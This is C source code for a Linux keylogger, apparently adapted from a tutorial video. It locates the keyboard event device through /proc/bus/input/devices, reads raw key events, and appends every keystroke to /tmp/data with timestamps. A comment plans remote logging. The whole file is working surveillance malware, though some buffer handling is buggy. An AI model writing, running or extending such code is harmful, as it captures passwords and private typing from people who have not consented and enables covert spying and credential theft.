/* Compile and run with: g++ -c logger.c -o exec; sudo ./exec.
 * 
 * This implementation is a modified version of Joey Abrams' keylogger from:
 * https://www.youtube.com/watch?v=89k3llI51fU.
 * 
 */

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <regex.h>
#include <time.h>

#define LOGFILE "/tmp/data"

char* set_input();
void log_r(const char *driver);
void delimit(FILE *fp);

int main(int argc, char **argv) {

  // separate into functions
  // clean up log() by having an enum take care of uncaught codes
  // clean up log() by separating log entries by times
  // add remote logging functionality


  // find the keyboard driver
  char *driver = set_input(driver);


  // log from character device driver
  if(driver)
    log_r(driver); // separate delimit() function call from here based
  // on time elapsed between log entries */
  

  

}

char* set_input() {

  FILE *fptr = fopen("/proc/bus/input/devices", "r");
  
  if(!fptr)
    return "ERR: failure";
  
  char *driver = malloc(500 * sizeof(char));
  strcpy(driver, "/dev/input/");
  
  const char *s = "keyboard";
  char buf[500]; // tmp

  while( fgets(buf, 500, fptr) ) 
    {
    char *ret = strstr(buf, s);
    if(ret) {

      // locate event handler line by offset
      for(int i = 0; i < 4; ++i)
	fgets(buf, 500, fptr);

      // there are many problems here and assumptions made
      char tmp[20];
      for(int i = 0; i < 500; ++i) {
	if(buf[i] == 'e' && buf[i+1] == 'v') {
	  for(int c = 0; c < 6; c++) {
	    tmp[c] = buf[i+c];
	  }
	}
      }

      
      
      strcat(driver, tmp);

    }
  }

  return driver;
}

void log_r(const char *driver) {
  struct input_event ev;
  int fd = open(driver, O_RDONLY);
  FILE *fp = fopen(LOGFILE, "a");

  char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";

  while(1) {

    time_t before = clock();
    
    read(fd, &ev, sizeof(ev));
    if((ev.type == EV_KEY) && (ev.value == 0)) {

      // split log file with current time
      time_t diff = clock() - before;
      
      if(diff > 10)
	delimit(fp);
      
      switch(ev.code) {
      case(0):
	fprintf(fp, "KEY_RESERVED");
	break;
      case(1):
	fprintf(fp, "KEY_ESC");
	break;
      case(14):
	fprintf(fp, "KEY_BACKSPACE");
	break;
      case(15):
	fprintf(fp, "KEY_TAB");
	break;
      case(28):
	fprintf(fp, "KEY_ENTER");
	break;
      case(29):
	fprintf(fp, "KEY_LEFTCTRL");
	break;
      case(42):
	fprintf(fp, "KEY_LEFTSHIFT");
	break;
      default:
	fprintf(fp, "%c\n", map[ev.code]);
      }
    }
    before = clock();

  }

  fclose(fp);
  close(fd);
  
}

void delimit(FILE *fp) {

  time_t rawtime;
  struct tm * timeinfo;

  time ( &rawtime );
  timeinfo = localtime ( &rawtime );
  fprintf (fp, "[%s", asctime (timeinfo) );
  fprintf(fp, "]\n");

}
